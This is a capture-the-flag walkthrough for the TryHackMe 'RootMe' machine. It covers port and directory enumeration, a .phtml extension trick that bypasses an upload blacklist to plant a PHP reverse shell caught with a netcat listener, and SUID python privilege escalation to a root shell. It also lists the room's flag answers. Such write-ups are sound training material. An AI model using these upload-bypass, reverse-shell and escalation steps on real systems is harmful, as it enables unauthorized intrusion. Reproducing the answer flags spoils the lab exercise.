
# RootMe (CTF)

```
export ip=10.10.46.48
```

# 1. Scan the machine, how many ports are open?

```json
nmap -sC -sV -oN scans/normal_nmap $ip
``` 
```
good habit but it is optional u can run a scan for all the ports 
```
```json
nmap -p -oN scans/allports_nmap $ip
```
```
answer: 2
```
# 2. What version of Apache is running?

```
using our nmap scan results (u can download my scan or run the command yourself)
we can see 80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
```
```
answer: 2.4.29
```
# 3. What service is running on port 22?

```
using common knowledge and our nmap scan we know ssh is running on port 22
```
```
answer: ssh
```
# 4. What is the hidden directory?

```
we can find the hidden directory using gobuster. while the gobuster is searching we
should also check out the webserver ourselves.
```

```json 
gobuster dir -u http://10.10.46.48 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -o scans/gobuster
```
```
after running gobuster we can see some interesting directories such as panel and uploads. if we go to panel we can upload a file and uploads stores them. 
```
```
answer: /panel/
```
# 5. user.txt

```
now using this knowledge we need to get a shell into the system. Considering we have a uploads and a way to upload already for us we can use this vulnerablility. Im going
to use pentestmonkey's php reverse shell (https://github.com/pentestmonkey/php-reverse-shell) and edit the ip and port to my own
```
```json
nc -lvnp 1337
```
```
looks like we cant upload .php extensions. There are many different ways to go around this but the route i took was using .phtml as its considered a php file but gets past the blacklist as "php" isnt the file name. Now lets go to /uploads/ and click our file
```

```
now that we have a shell lets upgrade it to a interactive tty using python. 
You can check if the box has python by using "which python" or "which python3"
```
```json
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl + z
stty raw -echo
fg
```
```
usually user flags are found in the users home folder as well as in the /var/www/ folder. Always check where u land just in case first using ls -la. we landed in the / directory and it was clean and so was the /home/. So lets check /var/www and boom there we go. lets use cat or nl and to vie wthe txt file and put the flag into tryhackme.
```
```
answer: THM{y0u_g0t_a_sh3ll}
```
# 6. Search for files with SUID permission, which file is weird?

```
 setuid (SUID) allows users to run an executable with the file system permissions of the executable's owner. So if the application has a suid and the owner was root any user on the machine can exploit the application.
 ```
 ```json
find / -user root -perm /4000 2>/dev/null
 ```
 ```
 this searches the whole machine for files with the user as root with the permission of 4000 (suid) and hides any error messages. Lets see which file is odd.
 you can use your own device as a check to see whats weird but straight away i can see
 /usr/bin/python is very odd to have a suid flag
 ```
 ```
 answer: /usr/bin/python
 ```

 # 7. root.txt

 ```
 we can know use gtfobins (https://gtfobins.github.io/)and escalate to root.
 ```
 ```json
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
```
if we run "whoami" or "id" we can see we are now root. Now the root flag is usually stored in /root/. If not you can search the box for the flag using 
"find / -name root* 2>/dev/null"
so lets cd into root and cat our flag and complete the box !
```
```
answer: THM{pr1v1l3g3_3sc4l4t10n}
```

```json
Congrats on finishing RootMe!
``` 




